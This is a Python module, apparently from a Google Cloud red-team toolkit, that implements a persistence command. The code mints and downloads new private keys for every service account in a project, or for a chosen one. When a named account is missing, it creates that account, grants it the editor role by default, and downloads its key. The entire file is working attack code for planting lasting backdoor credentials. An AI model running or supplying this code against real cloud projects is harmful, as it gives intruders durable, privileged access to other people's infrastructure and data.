"""
Author:         Anirban Das
                github.com/anrbn
                linkedin.com/in/anrbnds

Command:        pers service-account-keys
Description:    Creates and downloads Service Account Key for Persistence. 
Explained:      Creates and downloads the key of every Service Account or a specific Service Account that exists in a project for Persistence. If the Service Account given doesn't exist, it will be created along with the key which is then downloaded.  
"""

import os
import base64
import json
import colorama, platform

import google.auth
from google.oauth2 import service_account
import google.oauth2.credentials

from googleapiclient.discovery import build


if os.path.exists("/.dockerenv"):
    output_dir = "/tmp/GATOR/download/Persistence/Cloud IAM/service-account-keys"
#elif platform.system() == "Windows":
    #output_dir = "./download/Persistence/Cloud IAM/service-account-keys"
else:
    output_dir = "./download/Persistence/Cloud IAM/service-account-keys"

os.makedirs(output_dir, exist_ok=True)


if platform.system() == "Windows":
    colorama.init()

RESET = colorama.Style.RESET_ALL
BOLD = colorama.Style.BRIGHT
RED = colorama.Fore.RED
GREEN = colorama.Fore.GREEN
YELLOW = colorama.Fore.YELLOW
MAGENTA = colorama.Fore.MAGENTA


def run_module(project_id, serviceaccountpath, active_access_token, account=None, roleid=None, sadisplayname=None):
    output = ""
    try:
        if serviceaccountpath is not None:
            creds = service_account.Credentials.from_service_account_file(serviceaccountpath)
        elif active_access_token is not None:
            creds = google.oauth2.credentials.Credentials(active_access_token)
        else:
            output += f"{RED}- No valid authentication method provided.{RESET}\n"
            return output
        
        service = build('iam', 'v1', credentials=creds)

        response = service.projects().serviceAccounts().list(name=f'projects/{project_id}').execute()
        all_accounts = [account['email'] for account in response['accounts']]

        if account == 'default' or account is None:
            accounts_to_download = all_accounts
        else:
            if account in all_accounts:
                accounts_to_download = [account_email for account_email in all_accounts if account_email == account]
            else:
                output += (f"{RED}- Account not found: {account}{RESET}\n")
                new_account, create_saccount_output = create_saccount(project_id, serviceaccountpath, active_access_token, account=account, roleid=roleid, sadisplayname=sadisplayname)
                output += create_saccount_output

                if new_account:
                    accounts_to_download = [new_account["email"]]
                else:
                    return output

        for account_email in accounts_to_download:
            key = service.projects().serviceAccounts().keys().create(
                name=f'projects/{project_id}/serviceAccounts/{account_email}',
                body={'keyAlgorithm': 'KEY_ALG_RSA_2048'}
            ).execute()

            key_data = key['privateKeyData']
            decoded_key_data = base64.b64decode(key_data)
            json_key_data = json.loads(decoded_key_data)

            with open(f'{output_dir}/{account_email}-key.json', 'w') as key_file:
                json.dump(json_key_data, key_file, indent=2)

            output += (f"{GREEN}+ Successfully downloaded key for Service Account: {account_email}{RESET}\n")
            output += (f"  Directory: {output_dir}\n")
    except Exception as e:
        output += f"{RED}  An error occurred: {str(e)}{RESET}"
        return output

    return output


def create_saccount(project_id, serviceaccountpath, active_access_token, account=None, roleid=None, sadisplayname=None):
    output = ""
    try:
        account = account.split("@")[0]

        if sadisplayname is None or sadisplayname == "default":
            sadisplayname = "Service Account"

        if serviceaccountpath is not None:
            creds = service_account.Credentials.from_service_account_file(serviceaccountpath)
        elif active_access_token is not None:
            creds = google.oauth2.credentials.Credentials(active_access_token)
        else:
            output += f"{RED}- No valid authentication method provided.{RESET}\n"
            return output

        iam_service = build('iam', 'v1', credentials=creds)
        resource_manager_service = build('cloudresourcemanager', 'v1', credentials=creds)

        create_service_account = {
            'accountId': account,
            'serviceAccount': {
                'displayName': sadisplayname
            }
        }

        response = iam_service.projects().serviceAccounts().create(
            name=f'projects/{project_id}',
            body=create_service_account
        ).execute()
        output += (f"{GREEN}+ Service account {response['email']} created successfully.{RESET}\n")

        if roleid is None or roleid == "default":
            role_ids = ["roles/editor"]
        else:
            role_ids = roleid.split(', ')

        policy = resource_manager_service.projects().getIamPolicy(resource=project_id, body={}).execute()
        for role_id in role_ids:
            binding = {
                'role': role_id.strip(),
                'members': [f'serviceAccount:{response["email"]}']
            }
            policy['bindings'].append(binding)
        resource_manager_service.projects().setIamPolicy(resource=project_id, body={'policy': policy}).execute()
        output += (f"{GREEN}+ Roles {', '.join(role_ids)} granted to service account {response['email']}.{RESET}\n")
        return response, output

    except Exception as e:
        output += f"{RED}  An error occurred: {str(e)}{RESET}"
        return output
